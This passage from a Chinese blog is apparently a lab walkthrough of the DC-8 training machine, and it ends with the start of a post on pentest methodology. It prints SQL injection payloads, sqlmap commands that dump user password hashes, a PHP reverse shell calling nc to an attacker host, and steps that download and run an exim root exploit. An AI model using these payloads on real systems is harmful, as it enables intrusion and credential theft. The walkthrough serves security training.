alt="img"></p><p>浅浅尝试访问了上述爆破出来有链接的网址(状态码全是301)，ok，全都无法正常访问（没有权限访问）。</p><p>然后尝试访问其它状态码(200)的目录：</p><blockquote><p> &#x2F;0  &#x2F;user   &#x2F;node   &#x2F;User   &#x2F;Node </p></blockquote><p>发现了用户登陆界面：<a href="http://192.168.204.137/user">http://192.168.204.137/user</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723294789068.png" alt="img"></p><p>当然，既然爆破得到的目录中有<code>/admin</code>目录，那也尝试访问一下吧：</p><p>结果就是没有权限访问了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723352782599.png" alt="img"></p><h3 id="dirsearch爆破"><a href="#dirsearch爆破" class="headerlink" title="dirsearch爆破"></a>dirsearch爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u http://192.168.204.137 -x 400-500<br></code></pre></td></tr></table></figure><p><code>-x 400-500</code>：表示过滤掉状态码为400到500区间内的结果，即不显示。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723280691223.png" alt="img"></p><p>查找其中有用的网页文件信息，发现也只有如下的登陆界面。</p><p><a href="http://192.168.204.137/user/login/">http://192.168.204.137/user/login/</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723311841043.png"></p><h3 id="dirb目录爆破"><a href="#dirb目录爆破" class="headerlink" title="dirb目录爆破"></a>dirb目录爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb http://192.168.204.137<br></code></pre></td></tr></table></figure><p>快，但是好多！爆破好久了都还没结束。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723352291051.png" alt="img"></p><p>有好多条结果，需要做筛选~</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723353121936.png" alt="img"></p><p>看过去，大体目录列表跟前面两个的爆破结果类似，只是在主目录下会细分有多个子目录，但是尝试访问过之后，发现均无法正常访问。</p><h2 id="登陆用户账户查找"><a href="#登陆用户账户查找" class="headerlink" title="登陆用户账户查找"></a>登陆用户账户查找</h2><p>对用户登陆界面进行输入抓包，看看是什么情况：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723355419677.png" alt="img"></p><p>有用户名和密码字段，但看不出其它什么有用的东西。</p><h3 id="漏洞搜索"><a href="#漏洞搜索" class="headerlink" title="漏洞搜索"></a>漏洞搜索</h3><ul><li>Metasploit</li></ul><p>前面我们在进行端口扫描的时候得知目标靶机使用的是CMS Drupal 7，使用Metasploit来进行漏洞搜索。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br>search drupal 7<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723355783324.png" alt="img"></p><p>尝试利用最新的那个漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/unix/webapp/drupal_drupalgeddon2<br>show options<br><span class="hljs-built_in">set</span> RHOSTS 192.168.204.137<br>run<br></code></pre></td></tr></table></figure><p>但是，结果显示，尽管应用已经实现，但是仍没有会话session被成功创建。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723355888236.png" alt="img"></p><p>当然可以尝试利用其它的漏洞，全都尝试过之后发现，所有可以利用的漏洞都无法成功创建session，也就是说，都失败了。</p><ul><li>searchsploit</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit drupal 7<br></code></pre></td></tr></table></figure><p>得到很多结果哈哈：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723356297869.png" alt="img"></p><blockquote><p>.pl后缀的文件：</p><p>是Perl脚本文件，其执行需要先到包含.pl文件的目录，然后使用<code>perl + 脚本文件名（带后缀）</code>执行目标脚本（需要先保证已经安装有perl，通过<code>perl -v</code>检查）。如果遇到了权限问题，可以尝试使用<code>chmod +x 脚本文件名</code>赋予执行权限，然后直接<code>./文件名</code>运行脚本。</p><p>.rb后缀的文件：</p><p>是Ruby脚本文件，同样需要先导航到目标文件所在目录，然受使用<code>ruby + 脚本文件名</code>执行文件。</p></blockquote><p>尝试这五个Drupal 7的漏洞利用文件吧：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723356986358.png" alt="img"></p><blockquote><p>34992.py  44355.php  34984.py  34993.php  35150.php</p></blockquote><p>先尝试那两个python脚本文件吧，php脚本文件的执行比较复杂（其实是我还不了解&#x2F;doge）</p><p>使用<code>searchsploit -p</code>选项来查看文件的详细信息：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723357706534.png" alt="img"></p><blockquote><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;34992.py</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;34984.py</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723357837160.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723357871958.png" alt="img"></p><p>在尝试执行脚本的过程中都发生了错误（使用python3也是报错）。由于php脚本文件的利用稍显麻烦，所以我不打算强行攻克php脚本利用。</p><p>但是现在好像又没有什么思路了，找到了登陆界面，但是又不懂以什么形式找到合法的登陆账户。</p><h3 id="重新检索目标网站"><a href="#重新检索目标网站" class="headerlink" title="重新检索目标网站"></a>重新检索目标网站</h3><p>那就只能够返回去看看目标网站，看看有没有漏了什么信息或注入点。</p><p>果然，点了之后发现，这三个选项点击之后均不会像上面的home选项栏一样跳转到对应的界面，而是会显示如下的<code>√ 选项名称</code>，合理怀疑这里存在可利用的注入点。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723366739928.png" alt="img"></p><p>尝试对其进行抓包：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723367042659.png" alt="img"></p><p>经过对三个选项的点击跳转以及抓包，可以发现这三个界面在URL处分别对应着<code>nid=1/2/3</code>，抓到的数据包中最明显的特征也是参数<code>nid</code></p><blockquote><p>经过网络查询，在URL中，nid参数用于传递特定的标识符或查询条件，以便服务器能够根据该参数来返回相应的内容。</p><p>在<a href="http://192.168.204.137/?nid=1%E4%B8%AD%EF%BC%8Cnid=1%EF%BC%8C%E8%A1%A8%E7%A4%BA%E4%BC%A0%E9%80%92%E4%BA%86%E4%B8%80%E4%B8%AAnid%E5%8F%82%E6%95%B0%EF%BC%8C%E5%85%B6%E5%80%BC%E6%98%AF1%E3%80%82%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E7%BD%91%E7%AB%99%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%88%96%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%8F%AF%E8%83%BD%E4%BC%9A%E4%BD%BF%E7%94%A8%E8%BF%99%E4%B8%AA%E5%8F%82%E6%95%B0%E6%9D%A5%E7%A1%AE%E8%AE%A4%E9%9C%80%E8%A6%81%E6%98%BE%E7%A4%BA%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E6%AF%94%E5%A6%82%E7%89%B9%E5%AE%9A%E7%9A%84%E6%96%87%E7%AB%A0%E3%80%81%E9%A1%B5%E9%9D%A2%E6%88%96%E8%AE%B0%E5%BD%95%E3%80%82">http://192.168.204.137/?nid=1中，nid=1，表示传递了一个nid参数，其值是1。这种情况下，网站的服务器或应用程序可能会使用这个参数来确认需要显示的内容，比如特定的文章、页面或记录。</a></p></blockquote><p>在URL中携带参数，服务器进行响应，这个操作流程是不是感觉很熟悉很经典的样子。SQL注入的常见形式就是在URL地址栏进行注入。</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>当然还是得按照判断流程系统地判断一下是否真正地存在SQL注入，这里使用的是单引号判断法，在参数后加上一个单引号，回车，观察页面响应是否发生错误，如果发生错误，那就说明存在SQL注入。如果响应正常，那就需要更进一步的判断是否存在SQL注入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.204.137/?nid=3<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723379400842.png" alt="img"></p><p>根据结果，基本可以确定目标网站存在SQL注入漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">//判断列数，即字段数，从大到小判断，直到不报错为止<br>?nid=-1 order by 4<br>?nid=-1 order by 3<br></code></pre></td></tr></table></figure><blockquote><p>注意，这里以及之后的的id值为-1。用于测试或绕过某些逻辑验证。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723380560822.png" alt="img"></p><p>最后发现只有一个字段。</p><p>因为只有一个字段，所以我们在爆出数据库的时候只需要填写一个字段的值即可就是<code>database()</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">//union联合爆出数据库<br>?nid=-1 union <span class="hljs-keyword">select</span> database()--+<br><br>//如果是三个（或多个）字段的话，那可以如下注入<br>?nid=-1 union <span class="hljs-keyword">select</span> 1,database(),3--+<br>（因为一般查找的对象都是变量，所以给一个常量，会被后台数据库当作<span class="hljs-literal">true</span>，进而只对中间的database()进行解析并返回，返回的结果显示形式为： 1 | mydb | 3）<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723381350060.png" alt="img"></p><p>ok！返回了（非系统）数据库：<code>d7db</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">//也可以使用如下语句进行注入<br>?nid=-1 union <span class="hljs-keyword">select</span> group_concat(schema_name) from information_schema.schemata<br><br>//存在多个字段时，如下进行注入<br>?nid=-1 union <span class="hljs-keyword">select</span> 1,group_concat(schema_name),3 from information_schema.schemata<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723388121269.png" alt="img"></p><p>ok，也返回了数据库的名称：<code>d7db</code>和<code>information_schema</code>。</p><p>其中<code>information_schema</code>是SQL标准定义的系统数据库，用于存储关于数据库系统的元数据，它提供查询数据库结构的信息（上面我们在进行数据库爆破注入时使用到了这个数据库），主要用于系统维护和管理。</p><p>对于SQL注入漏洞，我们对应有SQLmap工具进行一系列的渗透和提权。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 检测是否存在注入，注意要将URL使用双引号括起来</span><br>sqlmap -u url<br><br><span class="hljs-comment"># 获取所有可访问的数据库名称</span><br>sqlmap -u url --dbs<br><br><span class="hljs-comment"># 获取指定库的所有表名 -D 指定数据库</span><br>sqlmap -u url -D DBname --tables<br><br><span class="hljs-comment"># 获取指定库指定表的字段名 -T 指定表名</span><br>sqlmap -u url -D DBname -T <span class="hljs-built_in">users</span> --columns<br><br><span class="hljs-comment"># 获取指定库指定表指定字段的数据 -C 指定字段名</span><br>sqlmap -u url -D DBname -T <span class="hljs-built_in">users</span> -C <span class="hljs-built_in">id</span>,username,password --dump<br><br><span class="hljs-comment"># 清除缓存进行注入 (删除sqlmap的output文件夹也可清除缓存)</span><br>sqlmap -u url --purge<br></code></pre></td></tr></table></figure><blockquote><ul><li>sqlmap -u “<a href="http://192.168.204.137/?nid=1">http://192.168.204.137/?nid=1</a>“</li></ul><p>提示GET参数nid是可注入的，即存在sql注入漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723389044998.png" alt="img"></p><ul><li>sqlmap -u “<a href="http://192.168.204.137/?nid=1">http://192.168.204.137/?nid=1</a>“ –dbs</li></ul><p>得到所有可访问的数据库名： d7db、information_schema。很明显，咱就是要从d7db数据库入手。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723389215618.png" alt="img"></p><ul><li>sqlmap -u “<a href="http://192.168.204.137/?nid=1">http://192.168.204.137/?nid=1</a>“ -D d7db –tables</li></ul><p>有很多！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723389551669.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723389571156.png" alt="img"></p><p>选择其中名为<code>users</code>的表进行进一步探索。</p><ul><li>sqlmap -u “<a href="http://192.168.204.137/?nid=1">http://192.168.204.137/?nid=1</a>“ -D d7db -T users –columns</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723389701376.png" alt="img"></p><p>发现其中有<code>name</code>和<code>pass</code>字段，之前我们对登陆界面抓包的时候看到过的，应该是对应用户名和密码的。</p><ul><li>sqlmap -u “<a href="http://192.168.204.137/?nid=1">http://192.168.204.137/?nid=1</a>“ -D d7db -T users -C name,pass  –dump</li></ul><p>（注意！两个或多个字段名之间的分隔符只能是一个英文逗号，不要随便加空格！）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723390088525.png" alt="img"></p><p>爆破得到两个用户名和密码，密码应该是经过hash加密的：</p><p>admin：</p><p>$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z</p><p>john：</p><p>$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku&#x2F;3if&#x2F;oRVZJaz5mKC2vF </p></blockquote><h2 id="爆破用户密码"><a href="#爆破用户密码" class="headerlink" title="爆破用户密码"></a>爆破用户密码</h2><p>前面我们通过sqlmap已经获得了两个用户的用户名和经过加密的密码。接下来就是要完整地获得整个能够合法登陆的账户。</p><h3 id="重置密码"><a href="#重置密码" class="headerlink" title="重置密码"></a>重置密码</h3><p>前面进行sqlmap查询的时候我们获得了数据库信息：目标网站使用的是MySql。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723391037475.png" alt="img"></p><p>一般在MySql中，对于密码的加密都是hash加密，所以可以尝试找找加密脚本。但是吧，我们还没有get到目标网站合法用户的shell。所以即使想要搜索加密脚本，也没有平台给我们搜索。</p><p>所以只能尝试爆破咯！</p><h3 id="碰撞爆破"><a href="#碰撞爆破" class="headerlink" title="碰撞爆破"></a>碰撞爆破</h3><h4 id="john密码爆破"><a href="#john密码爆破" class="headerlink" title="john密码爆破"></a>john密码爆破</h4><p>首先将得到的两个hash密码存放到文件中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim dc8hashpass.txt<br><span class="hljs-built_in">cat</span> dc8hashpass.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723391380705.png" alt="img"></p><p>然后进行爆破！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john dc8hashpass.txt<br></code></pre></td></tr></table></figure><p>等了很久只有一个明文密码<code>turtle</code>被爆破出来了！但不确定是哪个用户的明文密码，因此可以分别进行尝试。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723393910508.png" alt="img"></p><h4 id="hydra密码爆破"><a href="#hydra密码爆破" class="headerlink" title="hydra密码爆破"></a>hydra密码爆破</h4><p>主要是针对已有用户名，使用kali默认字典对目标网站进行ssh明文密码爆破。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim dc8users.txt<br><span class="hljs-built_in">cat</span> dc8users.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723391826337.png" alt="img"></p><p>使用默认字典：<code>/usr/share/wordlists/rockyou.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L dc8users.txt -P /usr/share/wordlists/rockyou.txt -e ns 192.168.204.137 ssh<br><br>或者执行如下指令：<br><br>hydra -L dc8users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.204.137<br></code></pre></td></tr></table></figure><p>爆破了很久都没有结果哦~放弃这个方法了吧。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723393972796.png" alt="img"></p><h2 id="用户登陆"><a href="#用户登陆" class="headerlink" title="用户登陆"></a>用户登陆</h2><p>前面获得的两个用户分别为：<code>admin</code> 和 <code>john</code>，通过john爆破得到一个明文密码<code>turtle</code></p><p>尝试登陆！发现那个明文密码是john用户的密码，成功登陆。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723394260943.png" alt="img"></p><h2 id="系统页面信息检索"><a href="#系统页面信息检索" class="headerlink" title="系统页面信息检索"></a>系统页面信息检索</h2><p>就是尽可能不要放过任何一个地方，寻找能够注入PHP代码的地方。最好有能够明确表示能执行PHP代码的注入点，比如之前在页面框存在一个能够选择解析结构的下拉框。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723465014974.png" alt="img"></p><p>最后在“Webform”模块的“Form setting”处找到了一个拥有“PHP code”下拉框的注入点。注入框内的提示信息跟游客访问主页的“Contact us”成功提交信息后的提示信息一致。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723465559313.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723464981498.png" alt="img"></p><p>尝试执行<code>&lt;?php phpinfo();?&gt;</code>。注意，要先选择“PHP code”解析模式。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723465785583.png" alt="img"></p><p>修改完毕后记得下拉保存。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723465879432.png" alt="img"></p><p>然后在<code>Contact Us</code>界面随便填写一些信息验证注入是否成功，记得邮箱的格式要规范哦~，最后得到如下结果，显然，注入成功了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723465903692.png" alt="img"></p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>接下来就是编写能够反弹shell的php代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br>//监听主机的IP以及监听端口<br><span class="hljs-variable">$target_ip</span> = <span class="hljs-string">&#x27;192.168.204.128&#x27;</span>;<br><span class="hljs-variable">$target_port</span> = 9999;<br><br>//反弹shell命令构造<br><span class="hljs-variable">$command</span> = <span class="hljs-string">&quot;nc <span class="hljs-variable">$target_ip</span> <span class="hljs-variable">$target_port</span> -e /bin/sh&quot;</span>;<br>// 或者这么写 <span class="hljs-string">&quot;nc -e /bin/sh <span class="hljs-variable">$target_ip</span> <span class="hljs-variable">$target_port</span>&quot;</span><br><br>//执行反弹shell命令<br>system(<span class="hljs-variable">$command</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><p>填入（注意是监听主机的IP地址哦！）：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723467919747.png" alt="img"></p><p>提前在终端监听端口：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723468026197.png" alt="img"></p><p>ok，反弹成功！</p><p>切换交互界面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723468150441.png" alt="img"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找具有SUID权限的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723468336265.png" alt="img"></p><p>其中可以尝试提权的命令有：<code>exim4</code></p><h3 id="exim4命令提权"><a href="#exim4命令提权" class="headerlink" title="exim4命令提权"></a>exim4命令提权</h3><p>查看exim4的版本：版本号为<code>4.89</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exim --version<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723468968130.png" alt="img"></p><p>使用searchsploit进行漏洞搜索：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723469961319.png" alt="img"></p><p>发现符合版本条件的共有三个：<code>46996.sh</code>、<code>46974.txt</code>、<code>43184.txt</code></p><p>优先尝试利用.sh脚本文件！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">//查看详细信息<br>searchsploit -p 46996.sh<br><br>//把脚本下载到当前目录下<br>searchsploit -m 46996.sh<br><br>//打开apache服务<br>service apache2 start<br><br>//把脚本移动到web根目录下<br><span class="hljs-built_in">mv</span> 46996.sh /var/www/html<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723470149465.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723470285179.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723470395162.png" alt="img"></p><p>然后去到目标靶机的<code>/tmp</code>目录下，使用<code>wget</code>命令下载脚本文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://192.168.204.128/46996.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723470531155.png" alt="img"></p><p>尝试直接执行脚本文件，结果当然是遭到拒绝了！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723470582531.png" alt="img"></p><p>需要先赋予该脚本文件执行权限，然后才能执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x 46996.sh<br>./46996.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723470689932.png" alt="img"></p><p>坏！好像没有成功切换到管理员权限！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723471275313.png" alt="img"></p><p>不是吧啊sir。。。</p><p>看了糖友的，发现执行时还需要添加一个<code>-m netcat</code></p><p>这不会是脚本中有关于使用信息的提示吧。。。。。</p><p>回去看看脚本内容：</p><p>真的有使用说明：有两种方法，需要带参数执行脚本文件。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723472623479.png" alt="img"></p><p>按理说，应该两个参数都能成功提权，分别进行尝试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">./46996.sh -m setuid<br>./46996.sh -m netcat<br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723472729438.png" alt="img"></p><p>发现，带<code>setuid</code>参数的脚本执行命令无法成功提权（如上）~但是带<code>netcat</code>参数的脚本执行命令可以！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723472765738.png" alt="img"></p><p>ok！成功提权之后，寻找flag文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723472799970.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1723472819581.png" alt="img"></p><p>ok，至此，所有任务成功结束。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>首先就是信息搜索这块内容，需要尽量每个部分都点点看看，不要漏掉什么可疑的地方。</p></li><li><p>然后就是注意利用漏洞文件提权之前最好先查看文件的内容，说不定里面会有一个usage使用方法，是和平常的操作方法不一样的呢，如此可以减少走弯路的时间。</p></li><li><p>sqlmap的使用方法需要熟悉和熟练使用。</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试·完整版</title>
    <link href="/2024/08/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%C2%B7%E5%AE%8C%E6%95%B4%E7%89%88/"/>
    <url>/2024/08/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%C2%B7%E5%AE%8C%E6%95%B4%E7%89%88/</url>
    
    <content type="html"><![CDATA[<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p><a href="https://blog.csdn.net/lady_killer9/article/details/106791542">网络安全-自学笔记</a></p><h2 id="渗透测试-1"><a href="#渗透测试-1" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="①流程"><a href="#①流程" class="headerlink" title="①流程"></a>①流程</h3><blockquote><p>前期交互</p><p>信息收集</p><p>威胁建模</p><p>漏洞分析</p><p>渗透攻击</p><p>后渗透攻击</p><p>报告</p></blockquote><h3 id="②测试方法"><a href="#②测试方法" class="headerlink" title="②测试方法"></a>②测试方法</h3><blockquote><p>白盒测试：基本从内部发起，通过正常渠道向被测单位获取资料。</p><p>黑盒测试：在授权的情况下，模拟黑客的攻击方法和思维方式，评估安全风险。黑盒测试不同于黑客入侵。</p></blockquote><h2 id="前期交互"><a href="#前期交互" class="headerlink" title="前期交互"></a>前期交互</h2><p>目标：</p><ul><li>确定范围：测试目标的范围、ip、域名、内外网、测试账户。</li><li>确定规则：能渗透到什么程度，所需要的时间，能够执行修改上传，能否提权等。</li><li>确定需求：web应用的漏洞，业务逻辑漏洞，人员权限管理漏洞等。</li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" 